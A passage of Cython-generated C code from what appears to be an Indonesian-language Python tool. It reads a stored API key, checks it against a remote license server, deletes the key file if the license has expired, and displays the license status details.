      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 76, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_apikey = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ses); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = 0;
      __pyx_t_8 = 127;
      __Pyx_INCREF(__pyx_kp_u_https_fall_xavier_my_id_check_ph);
      __pyx_t_7 += 40;
      __Pyx_GIVEREF(__pyx_kp_u_https_fall_xavier_my_id_check_ph);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_https_fall_xavier_my_id_check_ph);
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_v_apikey, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_8;
      __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u_dev);
      __pyx_t_7 += 5;
      __Pyx_GIVEREF(__pyx_kp_u_dev);
      PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_dev);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_device); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_8;
      __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_6, 3, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_6, 4, __pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      if (PyDict_SetItem(__pyx_t_9, __pyx_kp_u_user_agent, __pyx_n_u_chrome) < 0) __PYX_ERR(0, 77, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_10, __pyx_n_s_headers, __pyx_t_9) < 0) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_6, __pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_json); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_4 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 77, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_v_url = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_u_nama); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_nama = __pyx_t_4;
      __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_u_email); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_email = __pyx_t_4;
      __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_u_usage); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_status = __pyx_t_4;
      __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_u_join); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_bergabung = __pyx_t_4;
      __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_u_expired); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_kadaluwarsa = __pyx_t_4;
      __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_u_readtext); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_sisahari = __pyx_t_4;
      __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_kp_u_limit_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_device, __pyx_t_4) < 0) __PYX_ERR(0, 78, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_url, __pyx_n_u_status); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 79, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_u_kadaluarsa, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 79, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_12 = (__pyx_t_11 != 0);
      if (__pyx_t_12) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 80, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_remove); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 80, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_10, __pyx_kp_u_data_apikey_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_kp_u_data_apikey_txt);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 80, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_prints); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 81, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_Panel); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 81, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_10 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_5, __pyx_kp_u_bold_red_Maaf_lisensi_anda_tida) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_bold_red_Maaf_lisensi_anda_tida);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 81, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_6, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 81, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_time); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 82, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_sleep); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 82, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
          }
        }
        __pyx_t_4 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_9, __pyx_int_3) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_int_3);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 82, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ApiKey); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 83, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_menu_apikey); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 83, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 83, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 83, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

        
        goto __pyx_L9;
      }

      
       {
      }
      __pyx_L9:;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __Pyx_ErrFetch(&__pyx_t_9, &__pyx_t_4, &__pyx_t_10);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_FileNotFoundError); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 85, __pyx_L5_except_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_13 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_9, __pyx_t_6);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_ErrRestore(__pyx_t_9, __pyx_t_4, __pyx_t_10);
    __pyx_t_9 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0;
    if (__pyx_t_13) {
      __Pyx_AddTraceback("login.ceklisen", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_4, &__pyx_t_9) < 0) __PYX_ERR(0, 85, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_9);

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ApiKey); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 86, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_menu_apikey); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 86, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_14))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_14);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_14, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_14, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_14);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 86, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_6); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 86, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_14);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_prints); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_Panel); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __pyx_t_14 = PyTuple_New(16); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_14);
  __pyx_t_7 = 0;
  __pyx_t_8 = 127;
  __Pyx_INCREF(__pyx_kp_u_bold_Status_Apikey);
  __pyx_t_7 += 30;
  __Pyx_GIVEREF(__pyx_kp_u_bold_Status_Apikey);
  PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_kp_u_bold_Status_Apikey);
  if (unlikely(!__pyx_v_status)) { __Pyx_RaiseUnboundLocalError("status"); __PYX_ERR(0, 88, __pyx_L1_error) }
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_status, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 1, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_Nama_Apikey);
  __pyx_t_7 += 25;
  __Pyx_GIVEREF(__pyx_kp_u_Nama_Apikey);
  PyTuple_SET_ITEM(__pyx_t_14, 2, __pyx_kp_u_Nama_Apikey);
  if (unlikely(!__pyx_v_nama)) { __Pyx_RaiseUnboundLocalError("nama"); __PYX_ERR(0, 88, __pyx_L1_error) }
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_nama, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 3, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_Email_Apikey);
  __pyx_t_7 += 25;
  __Pyx_GIVEREF(__pyx_kp_u_Email_Apikey);
  PyTuple_SET_ITEM(__pyx_t_14, 4, __pyx_kp_u_Email_Apikey);
  if (unlikely(!__pyx_v_email)) { __Pyx_RaiseUnboundLocalError("email"); __PYX_ERR(0, 88, __pyx_L1_error) }
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_email, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 5, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_Tgl_Bergabung);
  __pyx_t_7 += 25;
  __Pyx_GIVEREF(__pyx_kp_u_Tgl_Bergabung);
  PyTuple_SET_ITEM(__pyx_t_14, 6, __pyx_kp_u_Tgl_Bergabung);
  if (unlikely(!__pyx_v_bergabung)) { __Pyx_RaiseUnboundLocalError("bergabung"); __PYX_ERR(0, 88, __pyx_L1_error) }
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_bergabung, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 7, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_Tgl_Kadaluwarsa);
  __pyx_t_7 += 25;
  __Pyx_GIVEREF(__pyx_kp_u_Tgl_Kadaluwarsa);
  PyTuple_SET_ITEM(__pyx_t_14, 8, __pyx_kp_u_Tgl_Kadaluwarsa);
  if (unlikely(!__pyx_v_kadaluwarsa)) { __Pyx_RaiseUnboundLocalError("kadaluwarsa"); __PYX_ERR(0, 88, __pyx_L1_error) }
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_kadaluwarsa, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 9, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_Sisa_Waktu_Apikey);
  __pyx_t_7 += 25;
  __Pyx_GIVEREF(__pyx_kp_u_Sisa_Waktu_Apikey);
  PyTuple_SET_ITEM(__pyx_t_14, 10, __pyx_kp_u_Sisa_Waktu_Apikey);
  if (unlikely(!__pyx_v_sisahari)) { __Pyx_RaiseUnboundLocalError("sisahari"); __PYX_ERR(0, 88, __pyx_L1_error) }
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_v_sisahari, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 11, __pyx_t_6);
  __pyx_t_6 = 0;
  __Pyx_INCREF(__pyx_kp_u_Device_Terpakai);
  __pyx_t_7 += 25;
  __Pyx_GIVEREF(__pyx_kp_u_Device_Terpakai);
  PyTuple_SET_ITEM(__pyx_t_14, 12, __pyx_kp_u_Device_Terpakai);
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_device); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_8;
